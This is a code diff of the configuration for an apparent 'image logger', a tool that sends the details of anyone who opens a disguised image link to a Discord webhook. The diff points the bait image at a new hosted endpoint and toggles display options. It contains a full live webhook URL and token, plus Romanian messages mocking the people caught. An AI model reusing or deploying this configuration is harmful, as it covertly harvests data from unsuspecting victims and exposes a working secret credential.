@@ -14,9 +14,9 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1351132998682148914/zSnHvI7XRVUyUvCiHe-VyYR3qSjirhCea_6tokks9tAtYFXc4gow_8IduK83G7AHDa6j",
-    "image": "https://counterstrike.fandom.com/wiki/Counter-Strike_Wiki", # You can also have a custom image by using a URL argument
+    "image": "https://tenor-wine-rho.vercel.app/api/image", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Vezi ca ai mai prins un prost", # Set this to the name you want the webhook to have
@@ -30,7 +30,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
         "message": "Esti un prost.", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
